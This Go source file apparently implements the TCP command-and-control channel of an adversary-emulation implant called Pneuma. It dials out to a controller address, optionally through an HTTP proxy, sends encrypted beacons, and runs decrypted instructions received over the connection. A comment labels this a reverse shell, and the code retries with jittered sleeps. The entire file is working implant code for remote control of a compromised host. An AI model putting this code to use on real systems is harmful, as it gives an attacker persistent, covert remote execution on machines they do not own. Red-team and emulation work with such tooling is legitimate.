package sockets

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/preludeorg/pneuma/util"
	"io"
	"net"
	"net/url"
	"strings"
)

type TCP struct {}

func init() {
	util.CommunicationChannels["tcp"] = TCP{}
}

func (contact TCP) Communicate(agent *util.AgentConfig, beacon util.Beacon) (util.Beacon, error) {
	for agent.Contact == "tcp" {
		conn, err := dialTCPConnection(agent)
	   	if err != nil {
	   		util.DebugLogf("[-] %s is either unavailable or a firewall is blocking traffic.", agent.Address)
	   	} else {
			bufferedSend(conn, beacon)

			//reverse-shell
			scanner := bufio.NewScanner(conn)
			for scanner.Scan() {
				message := strings.TrimSpace(scanner.Text())
				respond(conn, beacon, message, agent)
				if agent.Contact != "tcp" {
					return beacon, nil
				}
			}
	   	}
	   	jitterSleep(agent.Sleep, "TCP")
	}
	return beacon, nil
}

func dialTCPConnection(agent *util.AgentConfig) (net.Conn, error) {
	if agent.Proxy != "" {
		if proxyUrl, err := url.Parse(agent.Proxy); err == nil && proxyUrl.Scheme != "" && proxyUrl.Host != "" {
			return dialProxiedTCPConnection(proxyUrl, agent)
		}
	}
	return net.Dial("tcp", agent.Address)
}

func dialProxiedTCPConnection(proxyUrl *url.URL, agent *util.AgentConfig) (net.Conn, error) {
	conn, err := net.Dial("tcp", proxyUrl.Host)

	if err != nil {
		return conn, err
	}

	connectHeader := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n", agent.Address, agent.Address)
	if proxyUrl.User.String() != "" {
		connectHeader += fmt.Sprintf("Proxy-Authorization: basic %s\r\n", base64.StdEncoding.EncodeToString([]byte(proxyUrl.User.String())))
	}
	if _, err = fmt.Fprint(conn, connectHeader); err != nil {
		util.DebugLogf("Error writing to proxy socket")
	}
	return conn, err
}

func respond(conn net.Conn, beacon util.Beacon, message string, agent *util.AgentConfig){
	var tempB util.Beacon
	if err := json.Unmarshal([]byte(util.Decrypt(message)), &tempB); err == nil {
		beacon.Links = beacon.Links[:0]
		runLinks(&tempB, &beacon, agent, "\r\n")
	}
	refreshBeacon(agent, &beacon)
	bufferedSend(conn, beacon)
}

func bufferedSend(conn net.Conn, beacon util.Beacon) {
	data, _ := json.Marshal(beacon)
	allData := bytes.NewReader(append(util.Encrypt(data), "\n"...))
	sendBuffer := make([]byte, 1024)
	for {
		_, err := allData.Read(sendBuffer)
		if err == io.EOF {
			return
		}
		if _, err = conn.Write(sendBuffer); err != nil {
			util.DebugLog(err)
		}
	}
}